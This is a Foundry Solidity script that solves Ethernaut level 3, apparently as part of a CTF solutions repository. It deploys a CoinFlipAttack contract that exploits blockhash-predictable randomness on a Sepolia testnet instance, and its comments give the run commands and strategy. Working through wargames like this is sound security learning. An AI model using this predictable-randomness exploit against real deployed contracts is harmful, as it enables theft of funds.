// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip, CoinFlipAttack} from "../../src/ethernaut/03.sol";

// forge script script/ethernaut/03.s.sol --rpc-url $SEPOLIA_RPC_URL --account PK1_SEPOLIA --sender <ADDRESS> --broadcast -vvvv
// cast call --rpc-url $SEPOLIA_RPC_URL 0x193f876129B7EE7Bc617E21837EEcA2A704A9b46 "consecutiveWins()(uint256)"

/**
 * On-chain exploit strategy:
 *  - read the predictable outcome for the current block
 *  - submit exactly ONE flip per transaction
 *  - rerun this script in 10 consecutive/different blocks to finish the level.
 */

contract CoinFlipScript is Script {
    CoinFlip public coinFlipContract = CoinFlip(0x193f876129B7EE7Bc617E21837EEcA2A704A9b46);
    CoinFlipAttack public coinFlipAttackContract;

    function setUp() public {
        coinFlipAttackContract = new CoinFlipAttack(address(coinFlipContract));
    }

    function run() public {
        vm.startBroadcast();

        console.log("CoinFlip contract: ", address(coinFlipContract));
        console.log("Consecutive wins before tx: ", coinFlipContract.consecutiveWins());

        // Deploy and use a short-lived attacker so we only consume the blockhash once.

        CoinFlipAttack attacker = new CoinFlipAttack(address(coinFlipContract));
        attacker.attack();

        console.log("Consecutive wins after tx: ", coinFlipContract.consecutiveWins());
        vm.stopBroadcast();
    }
}
